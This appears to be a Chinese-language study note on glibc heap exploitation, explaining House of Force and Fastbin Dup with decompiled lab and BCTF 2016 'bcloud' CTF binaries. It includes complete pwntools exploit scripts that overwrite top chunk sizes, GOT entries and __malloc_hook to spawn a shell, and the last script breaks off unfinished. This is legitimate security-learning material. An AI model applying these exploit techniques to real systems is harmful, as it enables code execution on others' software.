<h1 id="Heap"><a href="#Heap" class="headerlink" title="Heap"></a>Heap</h1><p><a href="https://www.cnblogs.com/luoleqi/p/11801400.html">https://www.cnblogs.com/luoleqi/p/11801400.html</a></p>
<h2 id="Struct"><a href="#Struct" class="headerlink" title="Struct"></a>Struct</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><h2 id="Functions-and-Macros"><a href="#Functions-and-Macros" class="headerlink" title="Functions and Macros"></a>Functions and Macros</h2><h3 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h3><h3 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h3><h2 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h2><h2 id="Vulnerable"><a href="#Vulnerable" class="headerlink" title="Vulnerable"></a>Vulnerable</h2><h3 id="House-of-Force"><a href="#House-of-Force" class="headerlink" title="House of Force"></a>House of Force</h3><h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><p>用一个较大的值来重写top_chunk的大小字段，然后请求足够的内存来弥补顶块和目标数据之间的差距 。以这种方式进行的分配可以环绕VA空间，使得这种技术可以以比堆更低的地址为目标地址。</p>
<h4 id="详情"><a href="#详情" class="headerlink" title="详情"></a>详情</h4><p>在GLIBC版本&lt;2.29中，top chunk 大小字段在分配期间不受任何完整性检查。如果一个top chunk大小 的字段被覆盖，例如溢出并被替换成一个大的值，那么从该top chunk的后续分配可能会与使用中的内存重叠。在GLIBC&lt;2.30的版本中，从一个被破坏的top chunk中分配的非常大的内存可以环绕VA空间。</p>
<p>例如，一个top chunk 从地址0x405000开始，驻留在程序数据部分的地址0x404000的目标数据必须被覆盖。使用溢出覆盖顶top chunk 大小字段，将其替换为0xffffffffffffff1的值。接下来，计算将top chunk 移动到目标之前的地址所需的字节数。总数是0xffffffffffffffffff-0x405000字节，以达到VA空间的末端，然后是0x404000-0x20个字节，以在目标地址之前停止。<br>在这个请求top chunk得到服务后，下一个申请的块将与目标数据重叠。</p>
<h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><ul>
<li><p>GLIBC 2.29版引入了顶部块大小字段的合理性检查。<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=9431108626cdc0b5c1972ee00126228c8dd7166f;hp=e247c77b7d4de26e0f2fbec16e352889bac3781b;hb=30a17d8c95fbfb15c52d1115803b63aaa73a285c;hpb=34f86d61687457aa57d40cf3c230ca8404d40e45">link</a></p>
<p><img src="Heap.assets/image-20220814132821567.png" alt="image-20220814132821567"></p>
</li>
<li><p>GLIBC 2.30版引入了最大分配大小检查，它限制了 house of force”可以弥补的差距大小。<a href="https://sourceware.org/git/?p=glibc.git;a=blobdiff;f=malloc/malloc.c;h=0e3d4dd5163f5fa8fb07b71fb7e318e7b10f5cfd;hp=801ba1f499b566e677b763fc84f8ba86f4f7ccd0;hb=9bf8e29ca136094f73f69f725f15c51facc97206;hpb=52faba65f84ee5a8d82ff813bcfa0ee5f4d480cf">link</a></p>
<p><img src="Heap.assets/image-20220814133216729.png" alt="image-20220814133216729"></p>
</li>
</ul>
<h4 id="示例一：house-of-force"><a href="#示例一：house-of-force" class="headerlink" title="示例一：house_of_force"></a>示例一：house_of_force</h4><blockquote>
<p>文件详见附件 <a href="attachment/house_of_force/house_of_force">house_of_force</a></p>
</blockquote>
<h5 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h5><ul>
<li>修改target的值</li>
<li>获取shell</li>
</ul>
<h5 id="检查安全措施"><a href="#检查安全措施" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><pre><code class="shell">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/house_of_force]
└─$ checksec house_of_force                                 
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/house_of_force/house_of_force&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  &#39;../.glibc/glibc_2.28_no-tcache&#39;
</code></pre>
<h5 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h5><p>程序在运行时已给出libc地址及heap地址。</p>
<p>在<code>read(0, m_array[index++], v5 + 8);</code>中明显的溢出8个字节。</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned __int64 v4; // rax
  size_t v5; // rax
  unsigned int index; // [rsp+14h] [rbp-3Ch]
  char *m; // [rsp+18h] [rbp-38h]
  char *m_array[4]; // [rsp+20h] [rbp-30h] BYREF
  unsigned __int64 v9; // [rsp+48h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  House of Force&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  m = (char *)malloc(0x88uLL);
  printf(&quot;heap @ %p\n&quot;, m - 16);
  free(m);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 4LL);
      puts(&quot;2) target&quot;);
      puts(&quot;3) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;\ntarget: %s\n&quot;, target);
    }
    if ( num == 3 )
      break;
    if ( num == 1 )
    {
      if ( index &gt; 3 )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        v4 = read_num();
        m_array[index] = (char *)malloc(v4);
        if ( m_array[index] )
        {
          printf(&quot;data: &quot;);
          v5 = malloc_usable_size(m_array[index]);
          read(0, m_array[index++], v5 + 8);
        }
        else
        {
          puts(&quot;request failed&quot;);
        }
      }
    }
  }
  exit(0);
}
</code></pre>
<h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><ul>
<li>由于堆上输入的时候恰有8个字节的溢出，修改top_chunk，从而达到任意地址写。</li>
<li>修改__malloc_hook 为system的地址。</li>
</ul>
<h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li><p>使用8字节溢出修改top_chunk的size为0xffffffffffffffff</p>
<pre><code class="python">malloc(24, b&quot;Y&quot;*24 + p64(0xffffffffffffffff)) 
</code></pre>
<p><img src="Heap.assets/image-20220816100317563.png" alt="image-20220816100317563"></p>
</li>
<li><p>计算与目标地址的地址</p>
<pre><code class="python"># Calculate the &quot;wraparound&quot; distance between two addresses.                                             
def delta(x, y):                                                                                             return (0xffffffffffffffff - x) + y 
distance = delta(heap + 0x20, elf.sym.target - 0x20)
# heap -&gt; heap addr 0x20 -&gt;first chunk size
distance = (libc.sym.__malloc_hook - 0x20) - (heap + 0x20)
</code></pre>
</li>
<li><p>创建chunk，达到任意地址写</p>
<ul>
<li><p>modify_target</p>
<pre><code>~~~python
malloc(distance, b&quot;a&quot;)                                                   malloc(24, b&#39;aaaaaaa&#39;)
~~~
</code></pre>
<p>  <img src="Heap.assets/image-20220816100752788.png" alt="image-20220816100752788"></p>
</li>
<li><p>drop shell</p>
<pre><code class="python">malloc(distance, b&quot;/bin/sh&quot;)
malloc(24, p64(libc.sym.system))
cmd = heap + 0x30
malloc(cmd, b&#39;&#39;)
</code></pre>
<p><img src="Heap.assets/image-20220816101120303.png" alt="image-20220816101120303"></p>
</li>
</ul>
</li>
</ul>
<h4 id="示例二：BCTF-2016-bcloud"><a href="#示例二：BCTF-2016-bcloud" class="headerlink" title="示例二：BCTF 2016  bcloud"></a>示例二：BCTF 2016  bcloud</h4><blockquote>
<p>文件详见附件 <a href="attachment/bctf_2016_bcloud/bcloud">bcloud</a></p>
</blockquote>
<h5 id="检查安全措施-1"><a href="#检查安全措施-1" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><p><img src="Heap.assets/image-20220814164430494.png" alt="image-20220814164430494"></p>
<h5 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h5><ul>
<li><p>将程序打完注释后为<a href="attachment/bctf_2016_bcloud/bcloud.idb">bcloud.idb</a></p>
</li>
<li><p>在<code>my_input</code>函数中在末尾 a2 的位置加入一个<code>\x00</code>, 而在name_init中s本为64的大小，<code>my_input</code>也是64，但会在65的位置加一个<code>\x00</code>, 但是由于后面的v2赋值的操作，将<code>\x00</code>覆盖为了别的值，而且会在后面的<code>some_output</code>泄露出v2的堆地址。由于字符串的结束标志为<code>\x00</code>，所以<code>strcpy </code>和 <code>puts</code> 函数都会对这个v2的堆地址进行操作。</p>
<pre><code class="c">int __cdecl my_input(int a1, int a2, char a3)
{
  char buf; // [esp+1Bh] [ebp-Dh] BYREF
  int i; // [esp+1Ch] [ebp-Ch]

  for ( i = 0; i &lt; a2; ++i )
  {
    if ( read(0, &amp;buf, 1u) &lt;= 0 )
      exit(-1);
    if ( buf == a3 )
      break;
    *(_BYTE *)(a1 + i) = buf;
  }
  *(_BYTE *)(i + a1) = 0;
  return i;
}
unsigned int name_init()
{
  char s[64]; // [esp+1Ch] [ebp-5Ch] BYREF
  char *v2; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(s, 0, 0x50u);
  puts(&quot;Input your name:&quot;);
  my_input((int)s, 64, &#39;\n&#39;);
  v2 = (char *)malloc(0x40u);
  name_chunk_0x40 = (int)v2;
  strcpy(v2, s);
  some_output(v2);                              // 信息泄露
  return __readgsdword(0x14u) ^ v3;
}
int __cdecl some_output(const char *a1)
{
  printf(&quot;Hey %s! Welcome to BCTF CLOUD NOTE MANAGE SYSTEM!\n&quot;, a1);
  return puts(&quot;Now let&#39;s set synchronization options.&quot;);
}
</code></pre>
</li>
<li><p>在后面的<code>org_host_init</code>函数中对于org及host的初始化也像上述一样，我们注意到<code>strcpy</code>在给org赋值的时候会将org字符串、org返回地址以及host字符串全部赋给org，从而造成堆溢出构造我们使用<code>house of force</code>的条件。</p>
<pre><code class="c">unsigned int org_host_init()
{
  char org_chunk_con[64]; // [esp+1Ch] [ebp-9Ch] BYREF
  char *org_chunk; // [esp+5Ch] [ebp-5Ch]
  char host_chunk_con[68]; // [esp+60h] [ebp-58h] BYREF
  char *host_chunk; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(org_chunk_con, 0, 0x90u);
  puts(&quot;Org:&quot;);
  my_input((int)org_chunk_con, 64, 10);
  puts(&quot;Host:&quot;);
  my_input((int)host_chunk_con, 64, 10);
  host_chunk = (char *)malloc(0x40u);
  org_chunk = (char *)malloc(0x40u);
  org_chunk_addr = (int)org_chunk;
  host_chunk_addr = (int)host_chunk;
  strcpy(host_chunk, host_chunk_con);
  strcpy(org_chunk, org_chunk_con);    // &lt;---
  puts(&quot;OKay! Enjoy:)&quot;);
  return __readgsdword(0x14u) ^ v5;
}
</code></pre>
</li>
<li><p>在后续的<code>new_note</code>、<code>show_note</code> 、<code>edit_note</code>、 <code>del_note</code>便为常规操作，值得注意的是程序最多创建10个node，将其地址和大小分别储存在<code>node_list</code>和<code>node_size_list</code>中，从而方便我们使用<code>edit_note</code>的时候修改某些值。</p>
</li>
</ul>
<h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><ul>
<li>泄漏 heap 地址</li>
<li>利用溢出修改 top chunk 的 size</li>
<li>分配一个 chunk，将 top chunk 转移到 node_size_list 数组前面</li>
<li>再次分配 chunk，即可覆盖 node_list ，并利用 Edit 修改其内容</li>
<li>修改 <code>free@got.plt</code> 为 <code>puts@got.plt</code>，泄漏 libc</li>
<li>修改 <code>atoi@got.plt</code> 为 <code>system@got.plt</code>，得到 shell</li>
</ul>
<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul>
<li><p>使用name的输入 -》 泄露堆地址</p>
<pre><code class="python"># leak the heap addr
# dbg()
io.sendafter(&quot;name:\n&quot;, b&#39;A&#39;*0x40)
heap = u32(io.recvuntil(b&quot;! Welcome to BCTF&quot;, drop=True)[-4:])
log.info(f&quot;heap_addr -&gt; {hex(heap)}&quot;)
</code></pre>
<p><img src="Heap.assets/image-20220814182744179.png" alt="image-20220814182744179"></p>
</li>
<li><p>利用org和host的输入 -》 修改top chunk的size为-1</p>
<pre><code class="python"># overflow
io.sendafter(&quot;Org:\n&quot;, &quot;A&quot; * 0x40)
io.sendlineafter(&quot;Host:\n&quot;, p32(0xffffffff))
# dbg()
</code></pre>
<p><img src="Heap.assets/image-20220814194641198.png" alt="image-20220814194641198"></p>
</li>
<li><p>计算hack_chunk 的大小 将top_chunk移动至bss段</p>
<p>0x804b0a0 -&gt; note_size_list</p>
<pre><code class="python">new((0x804b0a0 - 0x10) - (heap + 0xd0), b&#39;AAAA&#39;)
</code></pre>
</li>
<li><p>新建一个chunk 覆盖note_list 数组，并修改其内容</p>
<pre><code class="python">payload = b&#39;A&#39;*0x80
payload += p32(elf.got.free) # note[0]
payload += p32(elf.got.atoi) * 2 # note[1] note[2]
new(0x8c, payload)
# dbg()
</code></pre>
<p><img src="Heap.assets/image-20220814212052885.png" alt="image-20220814212052885"></p>
</li>
<li><p>修改free_got 为 puts_got 泄露libc地址</p>
<pre><code class="python"># free@got.plt -&gt; puts@plt
edit(0, p32(elf.plt.puts))
dele(1)
atoi_addr = u32(io.recvn(4))
io.recv()
libc.address = atoi_addr - libc.sym.atoi
log.info(f&quot;libc addr -&gt; {hex(libc.address)}&quot;)
</code></pre>
<p><img src="Heap.assets/image-20220814212638115.png" alt="image-20220814212638115"></p>
</li>
<li><p>修改 atoi_got 为 system_got， 获得shell</p>
<pre><code class="python">system_addr = libc.sym.system
log.info(f&quot;system addr -&gt; {hex(libc.sym.system)}&quot;)
# dbg()
io.sendline(&#39;\n&#39;)
edit(2, p32(system_addr))
io.sendlineafter(b&#39;option---&gt;&gt;\n&#39;, b&#39;/bin/sh\x00&#39;)
io.interactive()
</code></pre>
<p><img src="Heap.assets/image-20220814214814810.png" alt="image-20220814214814810"></p>
</li>
</ul>
<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="python">#!/usr/bin/python3

from pwn import *
elf = context.binary = ELF(&#39;./bcloud&#39;)
libc = elf.libc
context.log_level = &#39;debug&#39;
gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

io = start()
def new(length, context):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;1&#39;)
    io.sendlineafter(&quot;note content:\n&quot;, str(length))
    io.sendlineafter(&quot;content:\n&quot;, context)
def edit(idx, context):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;3&#39;)
    io.sendline(str(idx))
    io.sendlineafter(&quot;content:\n&quot;, context)
def dele(idx):
    io.sendlineafter(&quot;option---&gt;&gt;\n&quot;, b&#39;4&#39;)
    io.sendlineafter(&quot;id:\n&quot;, str(idx))
def dbg():
    gdb.attach(io)
    pause()
# leak the heap addr
# dbg()
io.sendafter(&quot;name:\n&quot;, b&#39;A&#39;*0x40)
heap = u32(io.recvuntil(b&quot;! Welcome to BCTF&quot;, drop=True)[-4:])
log.info(f&quot;heap_addr -&gt; {hex(heap)}&quot;)

# overflow
io.sendafter(&quot;Org:\n&quot;, &quot;A&quot; * 0x40)
io.sendlineafter(&quot;Host:\n&quot;, p32(0xffffffff))
# dbg()

new((0x804b0a0 - 0x10) - (heap + 0xd0), b&#39;AAAA&#39;)
# new((0xffffffff - (heap + 0xd0) + (0x804b0a0 - 0x10)), b&#39;aaaa&#39;)
# dbg()
# new(0x40, b&quot;a&quot;*0x40)
payload = b&#39;A&#39;*0x80
payload += p32(elf.got.free) # note[0]
payload += p32(elf.got.atoi) * 2 # note[1] note[2]
new(0x8c, payload)
# dbg()
# free@got.plt -&gt; puts@plt
edit(0, p32(elf.plt.puts))
dele(1)
atoi_addr = u32(io.recvn(4))
io.recv()
libc.address = atoi_addr - libc.sym.atoi
log.info(f&quot;libc addr -&gt; {hex(libc.address)}&quot;)

system_addr = libc.sym.system
log.info(f&quot;system addr -&gt; {hex(libc.sym.system)}&quot;)
# dbg()
io.sendline(&#39;\n&#39;)
edit(2, p32(system_addr))

io.sendlineafter(b&#39;option---&gt;&gt;\n&#39;, b&#39;/bin/sh\x00&#39;)

io.interactive()
</code></pre>
<h3 id="Fastbin-Dub"><a href="#Fastbin-Dub" class="headerlink" title="Fastbin Dub"></a>Fastbin Dub</h3><h4 id="概述-1"><a href="#概述-1" class="headerlink" title="概述"></a>概述</h4><p>利用double-free错误，强制malloc返回一个chunk两次，中间不释放它。这种技术通常是通过破坏fastbin元数据，将一个假的块链接到fastbin中来利用的。这个假块可以被分配，然后程序功能可以被用来读取或写入一个任意的内存位置。</p>
<h4 id="详情-1"><a href="#详情-1" class="headerlink" title="详情"></a>详情</h4><p>fastbin中double free检查只确保被释放到fastbin中的块不是该bin中的第一个块(链表头部的块、刚刚释放的块)，如果在两个bin之间释放了一个相同大小的不同块，则检查通过。</p>
<ul>
<li><p>正常情况:</p>
<p><img src="Heap.assets/image-20220820160146712.png" alt="image-20220820160146712"></p>
</li>
<li><p>double free:</p>
<p><img src="Heap.assets/image-20220820161049541.png" alt="image-20220820161049541"></p>
<pre><code class="c">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */
        mchunkptr old = *fb, old2;
        unsigned int old_idx = ~0u;
        do {
            /* Check that the top of the bin is not the record we are going to add
               (i.e., double free).  */
            if (__builtin_expect(old == p, 0)) {
                errstr = &quot;double free or corruption (fasttop)&quot;;
                goto errout;
            }
            /* Check that size of fastbin chunk at the top is the same as
               size of the chunk that we are adding.  We can dereference OLD
               only if we have the lock, otherwise it might have already been
               deallocated.  See use of OLD_IDX below for the actual check.  */
            if (have_lock &amp;&amp; old != NULL)
                old_idx = fastbin_index(chunksize(old));
            p-&gt;fd = old2 = old;
        } while ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);

        if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect(old_idx != idx, 0)) {
            errstr = &quot;invalid fastbin entry (free)&quot;;
            goto errout;
        }
</code></pre>
</li>
<li><p>绕过 double free:</p>
<p><img src="Heap.assets/image-20220820162024274.png" alt="image-20220820162024274"></p>
</li>
</ul>
<p>除此之外，在释放时还会检查当前块的size域与头部域是否相等，由于我们释放的是同一个块，也就不存在该问题。</p>
<h4 id="如何利用fastbin-dup"><a href="#如何利用fastbin-dup" class="headerlink" title="如何利用fastbin dup"></a>如何利用fastbin dup</h4><p>将一个块二次释放后，我们继续malloc一个相同大小的块，此时malloc将从fastbin中创建块，而不是在top chunk中创建。此时我们往这个块中填写数据就意味着我们正在修改这个块的fd指针，将其修改为一个我们想要的值即可。</p>
<p><img src="Heap.assets/image-20220820164643151.png" alt="image-20220820164643151"></p>
<p>但是此过程中也存在着一个对size域的检查措施，因此我们常常使用__malloc_hook前35字节所出现的一个0x7f的大小字段，然后将__malloc_hook修改为one_gadget。所需要注意的是假尺寸字段中不兼容的标志，一个设置的NON_MAIN_ARENA标志和一个清除的 CHUNK_IS_MMAPPED标志会导致一个segfault。能够这样做的原因是，分配既不受对齐检查，也不受标志损坏检查</p>
<p><img src="Heap.assets/image-20220820181022737.png" alt="image-20220820181022737"></p>
<pre><code class="c">    /*
       If the size qualifies as a fastbin, first check corresponding bin.
       This code is safe to execute even if av is not yet initialized, so we
       can try it without checking, which saves some time on this fast path.
     */

    if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ())) {
        idx = fastbin_index (nb);
        mfastbinptr *fb = &amp;fastbin (av, idx);
        mchunkptr pp = *fb;
        do {
            victim = pp;
            if (victim == NULL)
                break;
        } while ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd, victim))
                 != victim);
        if (victim != 0) {
            if (__builtin_expect(fastbin_index (chunksize(victim)) != idx, 0)) {
                errstr = &quot;malloc(): memory corruption (fast)&quot;;
                errout:
                malloc_printerr(check_action, errstr, chunk2mem (victim), av);
                return NULL;
            }
            check_remalloced_chunk (av, victim, nb);
            void *p = chunk2mem (victim);
            alloc_perturb(p, bytes);
            return p;
        }
    }
</code></pre>
<h4 id="示例一：fastbin-dup"><a href="#示例一：fastbin-dup" class="headerlink" title="示例一：fastbin_dup"></a>示例一：fastbin_dup</h4><blockquote>
<p>文件详见附件 <a href="attachment/fastbin_dup/fastbin_dup">fastbin_dup</a></p>
</blockquote>
<h5 id="目标-1"><a href="#目标-1" class="headerlink" title="目标"></a>目标</h5><ul>
<li>修改target的值</li>
<li>获取shell</li>
</ul>
<h5 id="检查安全措施-2"><a href="#检查安全措施-2" class="headerlink" title="检查安全措施"></a>检查安全措施</h5><pre><code class="sh">┌──(fanya㉿ferity)-[~/…/heap/heaplab/part1/fastbin_dup]
└─$ checksec fastbin_dup   
[*] &#39;/home/fanya/Desktop/heap/heaplab/part1/fastbin_dup/fastbin_dup&#39;
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  &#39;../.glibc/glibc_2.30_no-tcache&#39;
</code></pre>
<h5 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h5><p>在程序运行时给出了libc的地址，并未阻止double free的操作。</p>
<pre><code class="c">int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  unsigned __int64 num; // rax
  unsigned int index; // [rsp+14h] [rbp-4Ch]
  size_t n; // [rsp+18h] [rbp-48h]
  unsigned __int64 na; // [rsp+18h] [rbp-48h]
  char *m_array[7]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v8; // [rsp+58h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts(&quot;\n===============&quot;);
  puts(&quot;|   HeapLAB   |  Fastbin Dup&quot;);
  puts(&quot;===============\n&quot;);
  printf(&quot;puts() @ %p\n&quot;, &amp;puts);
  memset(m_array, 0, sizeof(m_array));
  index = 0;
  printf(&quot;\nEnter your username: &quot;);
  read(0, &amp;user_0, 0x10uLL);
  while ( 1 )
  {
    while ( 1 )
    {
      printf(&quot;\n1) malloc %u/%u\n&quot;, index, 7LL);
      puts(&quot;2) free&quot;);
      puts(&quot;3) target&quot;);
      puts(&quot;4) quit&quot;);
      printf(&quot;&gt; &quot;);
      num = read_num();
      if ( num != 2 )
        break;
      printf(&quot;index: &quot;);
      na = read_num();
      if ( na &gt;= index )
        puts(&quot;invalid index&quot;);
      else
        free(m_array[na]);
    }
    if ( num &gt; 2 )
    {
      if ( num == 3 )
      {
        printf(&quot;\ntarget: %s\n&quot;, user_0.target);
      }
      else if ( num == 4 )
      {
        exit(0);
      }
    }
    else if ( num == 1 )
    {
      if ( index &gt; 6 )
      {
        puts(&quot;maximum requests reached&quot;);
      }
      else
      {
        printf(&quot;size: &quot;);
        n = read_num();
        if ( n &gt; 0x78 )
        {
          puts(&quot;fast chunks only (120 bytes maximum)&quot;);
        }
        else
        {
          m_array[index] = (char *)malloc(n);
          if ( m_array[index] )
          {
            printf(&quot;data: &quot;);
            read(0, m_array[index++], n);
          }
          else
          {
            puts(&quot;request failed&quot;);
          }
        }
      }
    }
  }
}
pwndbg&gt; ptype user
type = struct user {
    char username[16];
    char target[16];
}
00000000 user struc ; (sizeof=0x20, copyof_13)   ; XREF: .data:user_0/r
00000000 username db 16 dup(?)
00000010 target db 16 dup(?)
00000020 user ends
00000020
</code></pre>
<h5 id="思路分析-》modify"><a href="#思路分析-》modify" class="headerlink" title="思路分析-》modify"></a>思路分析-》modify</h5><ul>
<li>观察到target在user结构体的中的target，且该结构体的大小为0x20，使用开始的username的输入构造一个虚假的size字段。</li>
<li>进行fastbin dup，将fd改为user结构体的位置。</li>
<li>修改target</li>
</ul>
<h5 id="漏洞利用-》modify"><a href="#漏洞利用-》modify" class="headerlink" title="漏洞利用-》modify"></a>漏洞利用-》modify</h5><ul>
<li><p>fastbin dup </p>
<pre><code class="python"># Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)
</code></pre>
<p><img src="Heap.assets/image-20220820173211603.png" alt="image-20220820173211603"></p>
</li>
<li><p>修改fd指针</p>
<pre><code class="python"># modify fd
chunk_1 = malloc(0x28, p64(elf.sym.user))
</code></pre>
<p><img src="Heap.assets/image-20220820173412011.png" alt="image-20220820173412011"></p>
</li>
<li><p>malloc twice</p>
<pre><code class="python"># malloc_twice
malloc(0x28, b&quot;1&quot;)
malloc(0x28, b&quot;2&quot;)
</code></pre>
<p><img src="Heap.assets/image-20220820174021017.png" alt="image-20220820174021017"></p>
</li>
<li><p>malloc fake chunk</p>
<pre><code class="python"># malloc the fake chunk
malloc(0x28, b&quot;win !&quot;)
</code></pre>
<p>但此时由于我们之前并没有设置虚假的size字段，所以会出现一个中断。如果我们设置了那个虚假的字段，便修改完成</p>
<p><img src="Heap.assets/image-20220820174213853.png" alt="image-20220820174213853"></p>
</li>
<li><p>success</p>
<p><img src="Heap.assets/image-20220820175408919.png" alt="image-20220820175408919"></p>
</li>
</ul>
<h5 id="exp-》modify"><a href="#exp-》modify" class="headerlink" title="exp-》modify"></a>exp-》modify</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

# Index of allocated chunks.
index = 0

# Select the &quot;malloc&quot; option; send size &amp; data.
# Returns chunk index.
def malloc(size, data):
    global index
    io.send(b&quot;1&quot;)
    io.sendafter(b&quot;size: &quot;, f&quot;{size}&quot;.encode())
    io.sendafter(b&quot;data: &quot;, data)
    io.recvuntil(b&quot;&gt; &quot;)
    index += 1
    return index - 1

# Select the &quot;free&quot; option; send index.
def free(index):
    io.send(b&quot;2&quot;)
    io.sendafter(b&quot;index: &quot;, f&quot;{index}&quot;.encode())
    io.recvuntil(b&quot;&gt; &quot;)

io = start()

# This binary leaks the address of puts(), use it to resolve the libc load address.
io.recvuntil(b&quot;puts() @ &quot;)
libc.address = int(io.recvline(), 16) - libc.sym.puts
io.timeout = 0.1

# =============================================================================

# Set the username field.
username = p64(0) + p64(0x31)
io.sendafter(b&quot;username: &quot;, username)
io.recvuntil(b&quot;&gt; &quot;)

# Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x28, b&quot;A&quot;*0x28)
chunk_B = malloc(0x28, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
chunk_1 = malloc(0x28, p64(elf.sym.user))

# malloc_twice
malloc(0x28, b&quot;1&quot;)
malloc(0x28, b&quot;2&quot;)

# malloc the fake chunk
malloc(0x28, b&quot;win !&quot;)
# =============================================================================

io.interactive()
</code></pre>
<h5 id="思路分析-》drop-shell"><a href="#思路分析-》drop-shell" class="headerlink" title="思路分析-》drop shell"></a>思路分析-》drop shell</h5><ul>
<li>fastbin dup</li>
<li>__malloc_hook -&gt; one_gadget</li>
</ul>
<h5 id="漏洞利用-》drop-shell"><a href="#漏洞利用-》drop-shell" class="headerlink" title="漏洞利用-》drop shell"></a>漏洞利用-》drop shell</h5><ul>
<li><p>虚假字段的大小为0x7f -&gt; 意味着我们要申请0x68的chunk。然后fastbin dup 将其fd修改至__malloc_hook - 35 的位置。</p>
<pre><code class="python"># Request two 0x30-sized chunks and fill them with data.
chunk_A = malloc(0x68, b&quot;A&quot;*0x28)
chunk_B = malloc(0x68, b&quot;B&quot;*0x28)

# Free the first chunk, then the second.
free(chunk_A)
free(chunk_B)
free(chunk_A)

# modify fd
malloc(0x68, p64(libc.sym.__malloc_hook - 35))
</code></pre>
</li>
<li><p>填充0x13的垃圾数据，接着填入one_gadget的地址。</p>
<pre><code class="python"># malloc twice
malloc(0x68, b&#39;0&#39;)
malloc(0x68, b&#39;1&#39;)

# malloc fake chunk
# if no limit malloc&#39;s count
# malloc(0x68, p8(0)*0x13+p64(libc.sym.system))
# sh_addr = p64(next(libc.search(b&#39;/bin/sh\x00&#39;)))

# malloc(sh_addr, b&quot;&quot;)
one = [0xc4dbf, 0xc4de6, 0xe1fa1]
malloc(0x68, p8(0)*0x13+p64(libc.address + one[2]))
malloc(0x10, b&#39;&#39;)
</code></pre>
</li>
<li><p>drop shell</p>
<p><img src="Heap.assets/image-20220820184826255.png" alt="image-20220820184826255"></p>
</li>
</ul>
<h5 id="exp-》drop-shell"><a href="#exp-》drop-shell" class="headerlink" title="exp-》drop shell"></a>exp-》drop shell</h5><pre><code class="python">#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF(&quot;fastbin_dup&quot;)
libc = ELF(elf.runpath + b&quot;/libc.so.6&quot;) # elf.libc broke again

gs = &#39;&#39;&#39;
continue
&#39;&#39;&#39;
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)

